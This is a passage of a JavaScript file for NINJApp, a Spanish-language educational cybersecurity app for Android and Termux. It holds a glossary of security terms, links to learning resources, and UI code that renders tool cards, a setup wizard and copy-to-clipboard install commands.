    { term: 'Payload', def: 'Código malicioso diseñado para ejecutarse en el sistema objetivo tras una explotación exitosa.' },
    { term: 'Reverse Shell', def: 'Conexión saliente desde el objetivo hacia el atacante, otorgando control sobre la terminal del sistema comprometido.' },
    { term: 'Phishing', def: 'Técnica de ingeniería social que busca engañar a usuarios para que revelen información sensible (credenciales, datos bancarios).' },
    { term: 'DDoS', def: 'Distributed Denial of Service. Ataque que satura un servidor con tráfico masivo desde múltiples fuentes para dejarlo inaccesible.' },
    { term: 'MITM', def: 'Man-in-the-Middle. Ataque donde el atacante intercepta la comunicación entre dos partes sin que estas lo sepan.' },
    { term: 'OWASP', def: 'Open Web Application Security Project. Fundación sin fines de lucro dedicada a mejorar la seguridad del software.' },
    { term: 'API Key', def: 'Clave de autenticación para acceder a APIs. Su exposición puede llevar a uso no autorizado de servicios.' },
    { term: 'CORS', def: 'Cross-Origin Resource Sharing. Mecanismo de seguridad del navegador que controla qué dominios pueden acceder a recursos.' },
    { term: 'IDOR', def: 'Insecure Direct Object Reference. Vulnerabilidad donde un usuario puede acceder a objetos (archivos, datos) que no le pertenecen.' },
    { term: 'SSRF', def: 'Server-Side Request Forgery. Vulnerabilidad que permite a un atacante hacer que el servidor realice peticiones a lugares no previstos.' },
    { term: 'Honeypot', def: 'Señuelo o sistema trampa diseñado para atraer y detectar atacantes, estudiando sus técnicas y comportamientos.' },
    { term: 'Sandbox', def: 'Entorno aislado y seguro donde se ejecuta código no confiable para analizarlo sin riesgo al sistema principal.' },
    { term: 'Termux', def: 'Terminal emulator y entorno Linux para Android. Permite ejecutar herramientas de ciberseguridad directamente en el móvil.' },
    { term: 'F-Droid', def: 'Repositorio de apps open source para Android. Fuente recomendada para instalar Termux de forma segura.' },
    { term: 'WSL', def: 'Windows Subsystem for Linux. Capa de compatibilidad para ejecutar Linux directamente en Windows sin VM.' }
  ],

  resources: [
    {
      icon: '📱', title: 'Termux (F-Droid)', desc: 'Terminal Linux para Android. Esencial para ejecutar tools de seguridad en tu móvil. Instálalo desde F-Droid, NO desde Play Store.',
      url: 'https://f-droid.org/packages/com.termux/'
    },
    {
      icon: '🎓', title: 'TryHackMe', desc: 'Plataforma interactiva para aprender ciberseguridad con laboratorios guiados. Ideal para principiantes.',
      url: 'https://tryhackme.com'
    },
    {
      icon: '⚔️', title: 'HackTheBox', desc: 'Laboratorios de CTF y máquinas vulnerables para practicar hacking ético de nivel intermedio a avanzado.',
      url: 'https://hackthebox.com'
    },
    {
      icon: '📖', title: 'PortSwigger Web Security Academy', desc: 'Cursos gratuitos de seguridad web con laboratorios interactivos. De los mejores recursos gratuitos.',
      url: 'https://portswigger.net/web-security'
    },
    {
      icon: '🛡️', title: 'OWASP', desc: 'Estándares, guías y herramientas para seguridad de aplicaciones. El MASVS y ASVS son referencia obligada.',
      url: 'https://owasp.org'
    },
    {
      icon: '📱', title: 'OWASP Mobile Security Testing Guide', desc: 'Guía completa de pruebas de seguridad para apps móviles Android e iOS.',
      url: 'https://github.com/OWASP/owasp-mstg'
    },
    {
      icon: '💻', title: 'Termux-Dev Setup', desc: 'Guía para configurar Termux con herramientas de hacking ético.',
      url: 'https://github.com/termux/termux-packages'
    },
    {
      icon: '🏆', title: 'Bugcrowd / HackerOne', desc: 'Plataformas de Bug Bounty donde puedes encontrar vulnerabilidades reales y ganar recompensas.',
      url: 'https://bugcrowd.com'
    },
    {
      icon: '📜', title: 'Exploit-DB', desc: 'Base de datos de exploits y vulnerabilidades públicas. Mantenida por Offensive Security.',
      url: 'https://www.exploit-db.com'
    },
    {
      icon: '📘', title: 'The Cyber Plumber\'s Handbook', desc: 'Guía práctica de tunneling, port forwarding y pivoting en pruebas de penetración.',
      url: 'https://github.com/opsdisk/the_cyber_plumbers_handbook'
    },
    {
      icon: '🎥', title: 'IppSec (YouTube)', desc: 'Walkthroughs detallados de máquinas HackTheBox. Aprende técnicas reales de pentesting.',
      url: 'https://youtube.com/c/ippsec'
    },
    {
      icon: '📡', title: 'Shodan', desc: 'Buscador de dispositivos conectados a Internet. Encuentra servidores, cámaras, routers, PLCs.',
      url: 'https://www.shodan.io'
    },
    {
      icon: '📄', title: 'CVE Mitre', desc: 'Base de datos oficial de vulnerabilidades conocidas (CVEs). Fuente de consulta obligatoria.',
      url: 'https://cve.mitre.org'
    },
    {
      icon: '📚', title: 'Roadmap.sh - Cyber Security', desc: 'Roadmap visual de las habilidades necesarias para convertirte en profesional de ciberseguridad.',
      url: 'https://roadmap.sh/cyber-security'
    }
  ]
};

// ========== APP LOGIC ==========
const App = {
  currentSection: 'dashboard',
  currentFilter: 'all',
  searchQuery: '',

  init() {
    this.renderDashboard();
    this.renderTools();
    this.renderLearning();
    this.renderGlossary();
    this.renderResources();
    this.setupNavigation();
    this.setupSearch();
    this.setupFilters();
    this.setupModal();
    this.hideSplash();
  },

  hideSplash() {
    setTimeout(() => {
      document.getElementById('splash').classList.add('hidden');
      if (!localStorage.getItem('ninjapp_wizard_done')) {
        setTimeout(() => this.showWizard(), 300);
      }
    }, 1500);
  },

  showWizard() {
    document.getElementById('setup-wizard').classList.add('open');
    document.querySelector('.wizard-step[data-step="1"]').classList.add('active');
  },

  nextWizardStep() {
    const current = document.querySelector('.wizard-step.active');
    const next = current.nextElementSibling;
    if (next && next.classList.contains('wizard-step')) {
      current.classList.remove('active');
      next.classList.add('active');
    }
  },

  closeWizard() {
    document.getElementById('setup-wizard').classList.remove('open');
    document.querySelectorAll('.wizard-step').forEach(s => s.classList.remove('active'));
    localStorage.setItem('ninjapp_wizard_done', 'true');
  },

  copyWizardCmd() {
    const cmd = 'pkg update && pkg upgrade -y';
    const el = document.querySelector('.wizard-command');
    if (navigator.clipboard) {
      navigator.clipboard.writeText(cmd).then(() => {
        if (el) { el.innerHTML = '✓ Copiado!'; setTimeout(() => { el.innerHTML = cmd; }, 1500); }
      });
    }
  },

  setupNavigation() {
    document.querySelectorAll('.nav-item').forEach(item => {
      item.addEventListener('click', () => {
        this.switchSection(item.dataset.section);
      });
    });
  },

  switchSection(section) {
    this.currentSection = section;
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.querySelector(`.nav-item[data-section="${section}"]`).classList.add('active');
    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
    document.getElementById(`section-${section}`).classList.add('active');
    document.getElementById('content').scrollTop = 0;
  },

  setupSearch() {
    document.getElementById('search-bar').addEventListener('input', e => {
      this.searchQuery = e.target.value.toLowerCase();
      this.renderTools();
    });
  },

  setupFilters() {
    document.querySelectorAll('.filter-chip').forEach(chip => {
      chip.addEventListener('click', () => {
        document.querySelectorAll('.filter-chip').forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
        this.currentFilter = chip.dataset.filter;
        this.renderTools();
      });
    });
  },

  setupModal() {
    const modal = document.getElementById('tool-modal');
    modal.addEventListener('click', e => {
      if (e.target === modal) modal.classList.remove('open');
    });
    document.getElementById('modal-close').addEventListener('click', () => {
      modal.classList.remove('open');
    });
  },

  openToolModal(toolId) {
    const tool = DATA.tools.find(t => t.id === toolId);
    if (!tool) return;

    const modal = document.getElementById('tool-modal');
    const content = modal.querySelector('.modal-content');

    content.innerHTML = `
      <div style="display:flex;align-items:flex-start;margin-bottom:16px;">
        <div style="flex:1;">
          <div class="modal-tool-name">${tool.icon} ${tool.name}</div>
          <span class="modal-tool-category">${tool.catLabel} · ${tool.platform || 'Multi-plataforma'}</span>
        </div>
        <button class="modal-close" id="modal-close-inner">✕</button>
      </div>

      <div class="modal-section-title">📖 Descripción</div>
      <div class="modal-tool-desc">${tool.desc}</div>

      ${tool.ethicalDesc ? `
      <div class="modal-section-title" style="color:var(--accent-yellow);">⚠️ Uso Ético</div>
      <div class="modal-tool-desc" style="color:var(--accent-yellow);margin-bottom:12px;">${tool.ethicalDesc}</div>
      ` : ''}

      <div class="modal-section-title">💻 Comandos</div>
      ${tool.commands.map(c => `
        <div style="margin-bottom:10px;">
          <div style="font-size:11px;color:var(--text-secondary);margin-bottom:3px;">${c.label}</div>
          <div class="modal-command">${c.cmd}</div>
        </div>
      `).join('')}

      <div class="modal-section-title">📥 Instalación</div>
      <div class="modal-command">${tool.install}</div>

      <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px;">
        ${tool.downloadUrl ? `
        <a href="${tool.downloadUrl}" target="_blank" rel="noopener noreferrer" style="flex:1;min-width:120px;text-align:center;padding:10px 16px;background:rgba(0,255,65,0.1);border:1px solid rgba(0,255,65,0.3);border-radius:var(--radius-sm);color:var(--accent-green);text-decoration:none;font-family:var(--font-mono);font-size:11px;">
          ⬇ ${tool.downloadLabel || 'Descargar'}
        </a>
        ` : ''}
        ${tool.url ? `
        <a href="${tool.url}" target="_blank" rel="noopener noreferrer" style="flex:1;min-width:120px;text-align:center;padding:10px 16px;background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.3);border-radius:var(--radius-sm);color:var(--accent-cyan);text-decoration:none;font-family:var(--font-mono);font-size:11px;">
          🌐 Sitio oficial
        </a>
        ` : ''}
      </div>

      ${tool.termux ? `
      <div style="margin-top:12px;padding:10px;background:rgba(0,0,0,0.3);border:1px solid var(--border-color);border-radius:var(--radius-sm);">
        <div style="font-size:10px;color:var(--accent-yellow);font-family:var(--font-mono);margin-bottom:4px;">📱 También disponible en Termux (Android)</div>
        <div style="font-size:10px;color:var(--text-muted);font-family:var(--font-mono);">Abre Termux y ejecuta: <span style="color:var(--accent-green);">${tool.install}</span></div>
      </div>
      ` : ''}
    `;

    content.querySelector('#modal-close-inner').addEventListener('click', () => {
      modal.classList.remove('open');
    });

    // Click-to-copy for command blocks
    content.querySelectorAll('.modal-command').forEach(block => {
      block.addEventListener('click', () => {
        const text = block.textContent.trim();
        if (navigator.clipboard) {
          navigator.clipboard.writeText(text).then(() => {
            block.style.borderColor = 'var(--accent-green)';
            const orig = block.innerHTML;
            block.innerHTML = '✓ ¡Copiado!';
            setTimeout(() => { block.innerHTML = orig; block.style.borderColor = ''; }, 1200);
          });
        }
      });
      block.style.cursor = 'pointer';
      block.title = 'Toca para copiar';
    });
    // Also make install command copyable
    const installBlocks = content.querySelectorAll('.modal-command');
    // Already handled above

    modal.classList.add('open');
  },

  copyBulkInstall() {
    const cmds = DATA.tools.filter(t => t.termux).map(t => t.install).filter((v,i,a) => a.indexOf(v)===i);
    const text = 'pkg update && pkg upgrade\n' + cmds.join('\n');
    if (navigator.clipboard) {
      navigator.clipboard.writeText(text).then(() => {
        const el = document.querySelector('[onclick="App.copyBulkInstall()"]');
        if (el) { el.textContent = '✓ Copiado!'; setTimeout(() => el.textContent = '📋 Copiar instalación masiva', 2000); }
      });
    }
  },

  renderDashboard() {
    const container = document.getElementById('dashboard-content');
    const toolCount = DATA.tools.length;
    const termuxCount = DATA.tools.filter(t => t.termux).length;

    container.innerHTML = `
      <div class="terminal-ticker">
        <span class="prompt">┌─[<span style="color:var(--accent-cyan);">ninja@NINJApp</span>]─[~]
        <br>└──╼ <span id="typed-text"></span><span class="cursor">█</span></span>
      </div>

      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-number">${toolCount}</div>
          <div class="stat-label">Herramientas</div>
        </div>
        <div class="stat-card cyan">
          <div class="stat-number">${termuxCount}</div>
          <div class="stat-label">En Termux</div>
        </div>
        <div class="stat-card purple">
          <div class="stat-number">${DATA.learning.length}</div>
          <div class="stat-label">Niveles</div>
        </div>
        <div class="stat-card yellow">
          <div class="stat-number">${DATA.glossary.length}</div>
          <div class="stat-label">Términos</div>
        </div>
      </div>

      <div class="card" style="border-color:rgba(0,212,255,0.3);">
        <div class="card-title" style="color:var(--accent-cyan);">📱 ¿Cómo usar las herramientas en Android?</div>
        <div class="card-desc">
          1. Instala <b>Termux</b> desde F-Droid (NO de Play Store)<br>
          2. Abre Termux y ejecuta: <span class="copy-cmd" style="color:var(--accent-green);cursor:pointer;" onclick="navigator.clipboard.writeText('pkg update && pkg upgrade');this.textContent='✓ Copiado!';">▶ pkg update && pkg upgrade</span><br>
          3. Cada herramienta tiene su comando de instalación en <b>Termux</b><br>
          4. Toca cualquier comando para copiarlo a tu clipboard
        </div>
        <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px;">
          <a href="https://f-droid.org/packages/com.termux/" target="_blank" rel="noopener noreferrer" class="card-tag tag-cyan" style="text-decoration:none;">⬇ Descargar Termux (F-Droid)</a>
          <span class="card-tag tag-green">${termuxCount} tools</span>
          <span class="card-tag tag-purple" style="cursor:pointer;" onclick="App.copyBulkInstall()">📋 Copiar instalación masiva</span>
        </div>
      </div>

      <div class="card">
        <div class="card-title">🎯 ¿Qué es NINJApp?</div>
        <div class="card-desc">
          Plataforma educativa de ciberseguridad para móvil. Aprende sobre herramientas de hacking ético,
          escaneo de vulnerabilidades, OSINT, seguridad móvil y más. Todo el contenido es
          educativo y promueve el uso ético y legal.
        </div>
        <div class="card-tag tag-green">Siempre con autorización</div>
      </div>

      <div style="margin-top:4px;">
        <div class="section-title" style="font-size:12px;margin-bottom:8px;">⚡ Acceso Rápido</div>
        <div class="quick-actions">
          <button class="quick-btn" data-quick="tools"><span class="qb-icon">🛡️</span> Herramientas</button>
          <button class="quick-btn" data-quick="learn"><span class="qb-icon">📚</span> Aprender</button>
          <button class="quick-btn" data-quick="zap"><span class="qb-icon">⚡</span> OWASP ZAP</button>
          <button class="quick-btn" data-quick="nmap"><span class="qb-icon">🌐</span> Nmap</button>
        </div>
      </div>
    `;

    container.querySelectorAll('[data-quick]').forEach(btn => {
      btn.addEventListener('click', () => {
        const target = btn.dataset.quick;
        if (target === 'tools') this.switchSection('tools');
        else if (target === 'learn') this.switchSection('learn');
        else { this.switchSection('tools'); this.openToolModal(target); }
      });
    });

    // Type effect
    const texts = [
      'Bienvenido a NINJApp...',
      'Instala Termux desde F-Droid...',
      'OWASP ZAP, Nmap, Burp Suite...',
      'Seguridad Móvil con OWASP MASVS...',
      'Siempre con autorización...'
    ];
    let ti = 0, ci = 0;
    const el = document.getElementById('typed-text');
    function typeEffect() {
      if (!el) return;
      if (ci < texts[ti].length) {
        el.textContent += texts[ti][ci];
        ci++;
        setTimeout(typeEffect, 30);
      } else {
        setTimeout(() => { el.textContent = ''; ci = 0; ti = (ti + 1) % texts.length; setTimeout(typeEffect, 500); }, 2000);
      }
    }
    setTimeout(typeEffect, 500);
  },

  renderTools() {
    const container = document.getElementById('tools-content');
    const query = this.searchQuery;
    const filter = this.currentFilter;
    let tools = DATA.tools;

    if (query) {
      tools = tools.filter(t =>
        t.name.toLowerCase().includes(query) ||
        t.desc.toLowerCase().includes(query) ||
        t.catLabel.toLowerCase().includes(query)
      );
    }
    if (filter !== 'all') {
      tools = tools.filter(t => t.category === filter);
    }

    if (tools.length === 0) {
      container.innerHTML = `<div class="empty-state"><div class="empty-icon">🔍</div><div class="empty-text">No se encontraron herramientas</div></div>`;
      return;
    }

    const grouped = {};
    tools.forEach(t => {
      if (!grouped[t.catLabel]) grouped[t.catLabel] = [];
      grouped[t.catLabel].push(t);
    });

    let html = '';
    for (const [category, catTools] of Object.entries(grouped)) {
      const termuxInCat = catTools.filter(t => t.termux);
      html += `<div style="margin-bottom:6px;">
        <div class="category-header">
          <div class="section-title" style="font-size:11px;">${catTools[0].icon} ${category}</div>
          ${termuxInCat.length ? `<span class="copy-cat-btn" data-cat-copy="${category}">📋 Copiar ${termuxInCat.length} tools</span>` : ''}
        </div>`;
      catTools.forEach(t => {
        html += `
          <div class="tool-card" data-tool="${t.id}">
            <div class="tool-card-header">
              <div class="tool-card-name">${t.icon} ${t.name}</div>
              <span class="tool-card-category">${t.termux ? '📱 Termux' : t.category}</span>
            </div>
            <div class="tool-card-desc">${t.desc.substring(0, 90)}...</div>
          </div>
        `;
      });
      html += `</div>`;
    }

    container.innerHTML = html;
    container.querySelectorAll('.tool-card').forEach(card => {
      card.addEventListener('click', () => this.openToolModal(card.dataset.tool));
    });
    container.querySelectorAll('.copy-cat-btn').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const catName = btn.dataset.catCopy;
        const catTools = DATA.tools.filter(t => t.catLabel === catName && t.termux);
        const cmds = [...new Set(catTools.map(t => t.install))];
        const text = cmds.join('\n');
        if (navigator.clipboard) {
          navigator.clipboard.writeText(text).then(() => {
            const orig = btn.textContent;
            btn.textContent = '✓ Copiado!';
            btn.style.borderColor = 'var(--accent-green)';
            setTimeout(() => { btn.textContent = orig; btn.style.borderColor = ''; }, 2000);
          });
        }
      });
    });
  },

  renderLearning() {
    const container = document.getElementById('learn-content');
    const labels = ['🟢 Básico', '🔵 Principiante', '🟡 Intermedio', '🟠 Avanzado', '🔴 Experto', '🟣 Especialista'];

    container.innerHTML = DATA.learning.map(l => `
      <div class="level-card level${l.level}">
        <div class="level-header">
          <div>
            <div class="level-title">${l.icon} ${l.title}</div>
            <div class="level-subtitle">${l.subtitle}</div>
          </div>
          <div style="display:flex;align-items:center;gap:8px;">
            <span style="font-size:10px;font-family:var(--font-mono);color:var(--text-muted);">${labels[l.level]}</span>
            <span class="level-arrow">▼</span>
          </div>
        </div>
        <div class="level-topics">
          <div style="margin-top:10px;">${l.topics.map(t => `<div class="topic-item"><span class="topic-check">○</span><span>${t}</span></div>`).join('')}</div>
        </div>
      </div>
    `).join('');

    container.querySelectorAll('.level-card').forEach(card => {
      card.querySelector('.level-header').addEventListener('click', () => card.classList.toggle('open'));
    });
  },

  renderGlossary() {
    const container = document.getElementById('glossary-content');
    const gl = [...DATA.glossary].sort((a, b) => a.term.localeCompare(b.term));
    let html = gl.map((entry, i) => `
      <div class="glossary-entry" data-letter="${entry.term[0].toUpperCase()}">
        <div class="glossary-term">${entry.term}</div>
        <div class="glossary-def">${entry.def}</div>
      </div>
    `).join('');
    container.innerHTML = html;
  },

  renderResources() {
    const container = document.getElementById('resources-content');
    container.innerHTML = DATA.resources.map(r => `
      <a href="${r.url}" target="_blank" rel="noopener noreferrer" class="resource-card" style="text-decoration:none;color:inherit;">
        <div class="resource-icon">${r.icon}</div>
        <div class="resource-info">
          <div class="resource-title">${r.title}</div>
          <div class="resource-desc">${r.desc}</div>
          <span class="resource-link">→ Visitar</span>
        </div>
      </a>
    `).join('');
  }
};

document.addEventListener('DOMContentLoaded', () => App.init());
